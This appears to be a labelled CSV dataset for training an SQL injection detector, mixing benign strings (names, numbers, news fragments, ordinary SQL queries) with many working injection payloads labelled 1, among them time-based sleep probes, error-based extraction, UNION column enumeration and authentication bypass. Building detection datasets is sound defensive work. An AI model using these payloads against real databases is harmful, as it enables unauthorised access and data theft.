Sentence,Label
75000191c,0
3953,0
2756434329152004,0
"select pg_sleep  (  5  )   and    (    (   ""%""  =  """,1
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"-2953"" )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( ""oaeh"" = ""oaeh",1
adalgisa,0
compte,0
" select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",1
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'zjxk'  =  'zjxk",1
SELECT * FROM protection WHERE    NOT everybody = 'able',0
99f0nfua6o53,0
"   SELECT track, frog, orderFROM bend WHERE prize  IS NOT NULL",0
"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",1
villar de la encina,0
timms,0
" SELECT * FROM cookies ORDER BY cut ASC, great DESC",0
" &quot; We want peace back; want stability , &quot; said Vanessa de Sousa , chief executive investment company ",0
SELECT * FROM impossible WHERE money = 'by'  OR fly = 'declared',0
0505974990919902,0
-2393%'   )    )    union all select 2772--,1
"1'  )   as ssez where 5351  =  5351 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
 Gönningen found extremely difficult cope hard well-positioned offensive moves ,0
van_eyk,0
"1%'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"  SELECT ADDTIME ( ""2017-06-15   09:34:21.000001"", ""5 2:10:5.000003"" ) ;",0
vitola@23horas.ad,0
"  SELECT Orders.fireplacerID, Employees.captain, Employees.seed FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.forID ORDER BY Orders.slowID",0
9.22805E+015,0
"1""   )    )    as fhlg where 1004  =  1004 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
"1  )   as cjmt where 4839  =  4839 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
SELECT TOP 50 PERCENT * FROM attack,0
1' )  where 3636 = 3636 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
"1%""  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and ""%"" = """,1
"1' )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( 'vgkt' = 'vgkt",1
SELECT * FROM individual WHERE slip  BETWEEN 10 AND 20,0
"-2460%""  )   or   (  2660  =  5767  )  *5767 and   (  ""%""  =  """,1
SELECT TOP 3 * FROM round,0
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
SELECT TOP 50 PERCENT * FROM bone,0
" &quot; We shortly make decision regarding whether play , &quot; said manager Thomas Tuchel ",0
"1%""  )  )   or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  ""%"" = """,1
" The road blocked accident investigated , statement continued ",0
3916,0
5323,0
4330170884223124,0
SELECT cell ( s )  FROM forest LEFT JOIN,0
-6144'  )   or 9385  =  2474--,1
gamal,0
rabadi,0
xaubet sorolla,0
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'nxkp' like 'nxkp,1
carstensen@freecreditcheck.vc,0
berrocal de huebra,0
19210,0
"  SELECT DATEDIFF ( ""2017-01-01"",   ""2016-12-24"" ) ;",0
SELECT Count ( * )  AS partly,0
"1 )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1
"ibilbidea artiga 36, 11?d",0
SELECT COUNT ( equal ) FROM suppose,0
SELECT * FROM paid WHERE whispered NOT LIKE 'everything%',0
"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fktl""  =  ""fktl",1
"1'  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'ogwd' like 'ogwd",1
"1"" and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and ""oyuj"" = ""oyuj",1
SELECT wait FROM choose UNION SELECT correct FROM available ORDER BY opposite,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367584 ) ,0
1'+  (  select 'mquh' where 3933  =  3933,1
"1"" )  as amak where 7938 = 7938 and elt ( 1210 = 1210,sleep ( 5  )  )  --",1
 Hundreds soldiers policemen guarded building Morsi arrived shortly 11am local time small motorcade ,0
SELECT behavior ( s )  FROM enjoy FULL OUTER JOIN,0
SELECT * FROM scale,0
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",1
-9340  )   where 5462  =  5462 or 3038  =  3038,1
bolado pellicer,0
148ad5ra,0
"1'  )  )   union all select null,null,null,null,null,null,null,null,null#",1
marijke,0
"1"" )  where 1705 = 1705",1
1  )   as jtfx where 8038  =  8038,1
telde,0
"  SELECT trip,shore FROM answer WHERE gulf = 'more' UNION SELECT record, melted FROM tea",0
"-4639""   )    )     )   or 8550  =  9348",1
   (  select top 1,1
"1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""dksc""  =  ""dksc",1
1' )  as lgex where 4068 = 4068 and 1378 = 9247--,1
"1"" )  where 1392 = 1392 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
6791380000000000,0
"calle tarragona, 185 11g",0
11653982c,0
"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
SELECT cut ( s )  FROM copper SELECT distant FROM cost,0
" select * from users where id = '1' union select +\.,@@VERSION -- 1'",1
"1   )    )    as sxhg where 7697  =  7697 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"admin"" )  or  ( ""1"" = ""1""/*",1
garcilln,0
"1%"" and 6408 = 7959--",1
SELECT * FROM flame WHERE men BETWEEN since09/01/1996minute AND teeth15/31/1996rocky,0
"1 )  union all select null,null,null,null#",1
SELECT COUNT ( sail )  FROM traffic,0
"1'  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( 'ujcx' = 'ujcx",1
" SELECT * FROM choose ORDER BY finger, entirely",0
escalona,0
DELETE FROM men,0
"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
"   SELECT Employees.shown, COUNT ( Orders.massageID )  AS soapFROM    ( OrdersINNER JOIN work ON Orders.biggerID  =  Employees.tieID ) ",0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",1
"1'|| ( select 'xuou' from dual where 7681 = 7681 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   ) ||'",1
4859430000000000,0
1437,0
SELECT * FROM chance WHERE similar = 'pile',0
fabiola,0
1'||  (  select 'xhcr' from dual where 9279  =  9279,1
"1"" where 6004  =  6004",1
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
"1 )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  ",1
8347221118078165,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",1
9os897,0
1' where 8482 = 8482 or sleep ( 5 ) #,1
" select * from users where id = 1 or 1#""{ union select version (  ) ,version (  )  -- 1",1
"-3063%""  )  )   )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( ""%"" = """,1
"1"" where 4161  =  4161 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
balcells parets,0
"alonso de mendoza, 31 3b",0
100,0
"1  )  )   as kgit where 1919 = 1919 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
"1 where 1153  =  1153 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
compurgar,0
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
SELECT TOP 50 PERCENT * FROM report SELECT * FROM yesterday FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit,0
elezaro,0
ossie,0
culubret lluss,0
colin,0
"1%'  )  )   and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",1
178,0
"   SELECT speed,exchange,gave,shown,above     (  (  orbit JOIN thought ON food.caught =  fought.does )   INNER JOIN mountainON Orders.somewhere =  under.betweenID ) ",0
SELECT * FROM label WHERE fox = 'else'  OR five = 'pleasure',0
"-8153' where 2436  =  2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",1
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""wtkx""  =  ""wtkx",1
"select pg_sleep ( 5 )  and  ( ""pjql"" like ""pjql",1
"c/ rafael belmonte garcia, 29,",0
"av. doa urraca, 31,",0
SELECT * FROM vessels WHERE phrase BETWEEN oxygen09/01/1996mice AND thou15/31/1996airplane,0
"-5230"" )  or elt ( 1032 = 1032,3623 )  and  ( ""aivb"" like ""aivb",1
-2869'  )  )   union all select 3216--,1
SELECT * FROM hospital WHERE series = 'stay',0
"-6096' )  where 1316 = 1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",1
amarjit,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and ""dwbh"" like ""dwbh",1
joyan,0
"1"" )  where 3958 = 3958 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
SELECT * FROM  ( SELECT hour FROM indicate ) ,0
SELECT AVG ( pan ) FROM conversation SELECT SUM ( notice ) ,0
ildara,0
SELECT column_name FROM table_name WHERE EXISTS,0
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
"1""  )  )   as nwnp where 6140 = 6140",1
"1%""  )  )   )  union all select null,null,null,null,null,null,null,null#",1
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1
"1 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) # kkmw",1
6019,0
SELECT * FROM bigger WHERE anyway = 'directly' LIMIT 3,0
48650,0
tr2cad4,0
FROM  ( SELECT DISTINCT airplane FROM flow ) ,0
"1'  )  )   as dtwh where 9633 = 9633 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
portal,0
"1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'iari'  =  'iari",1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%"" = """,1
SELECT diameter ( s )  FROM pictured FULL OUTER JOIN,0
nandan,0
"select * from generate_series ( 3086,3086,case when  ( 3086 = 3327 )  then 1 else 0 end )  limit 1--",1
SELECT MIN ( deal )  AS has FROM instrument,0
1' )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and  ( 'ifvz' like 'ifvz,1
SELECT TOP 3 * FROM growth SELECT * FROM catch 3SELECT * FROM mainly,0
SELECT * FROM stepped WHERE mud BETWEEN '1996-07-01' AND '1996-07-31',0
"1 )  as wokl where 1368 = 1368 union all select null,null,null,null,null,null--",1
" SELECT * FROM current ORDER BY planned, behavior",0
njar,0
SELECT * FROM road FETCH FIRST 3 ROWS ONLY,0
" But arrive Yaounde , board , transportation instruction covered Bwelle ",0
nelba,0
SELECT warm ( s )  FROM animal UNION,0
"1  )  )   as zkrr where 4730 = 4730 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",1
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1
"1'  )   where 6328  =  6328 union all select null,null,null,null,null,null,null,null,null#",1
if  (  3593  =  3779  )   select 3593 else drop function qtqy--,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11406 )  ORDER BY meta_id ASC",0
"c/ pea lara, 52, 7?b",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28313 )  ORDER BY meta_id ASC",0
 (  select   (  case when   (  9066  =  5598  )   then 1 else 9066*  (  select 9066 from information_schema.character_sets  )   end   )    ) ,1
" While people past centuries overly conscious , focusing pictures heaven hell &quot; defined ideas &quot; , contemporary prophetic teaching hope consummation characterised certain bashfulness , even speechlessness ",0
artica,0
belia,0
SELECT lion ( s )  FROM scale SELECT figure ( s ) ,0
rushmann@clubforex.jm,0
"1"" where 1618 = 1618 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
naredo reggiardo,0
"calle rio seco, s/n 13-g",0
"1'   )    )    as dtwh where 9633  =  9633 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
" &quot; For vast majority people health insurance works , keep , &quot; said speech Boston ",0
-5152'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'jumr' like 'jumr,1
SELECT TOP 3 * FROM between WHERE flame = 'what' SELECT * FROM newspaper,0
"1  )   where 4768  =  4768 union all select null,null,null,null,null,null,null,null#",1
-5313'  )  )   )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'wkkp' like 'wkkp,1
torreblanca pujades,0
13750,0
SELECT * FROM pictured WHERE shown = 'mix' FETCH FIRST 3 ROWS ONLY,0
"1' )  where 9091 = 9091 union all select null,null,null,null#",1
9036735261224878,0
"1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
masmitj,0
revelante,0
select   (  case when   (  4043  =  5276  )   then 4043 else 4043*  (  select 4043 from information_schema.character_sets  )   end  )  #,1
"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",1
1933711327714835,0
waldhorn_fregues@prensahp.sn,0
 It yet clear new owner use former Kindergarten ,0
ex27mulgar,0
1' )  where 1363 = 1363,1
fernandez alvarado 78,0
donner.vai@barcafedaniss.wf,0
  )   or   (  'x'  =  'x,1
oliva,0
"1' )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( 'cpfn' like 'cpfn",1
"aljaraque 196, 11d",0
scheppan-ishikawa@tuslimites.ly,0
SELECT * FROM halfway WHERE NOT spell = 'vote'  AND NOT straight = 'ship',0
09133,0
55265136t,0
wines@interanuncios.sn,0
"1  )   as rtpl where 1262  =  1262 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
1' and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and 'toxr' like 'toxr,1
SELECT AVG ( struggle )  FROM wave  SELECT SUM ( each ) ,0
SELECT DISTINCT talk FROM unhappy,0
 UPDATE prevent SET chicken = 'disease'WHERE practice = 'soft',0
-3899'  )   where 8152  =  8152 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3086' LIMIT 1,0
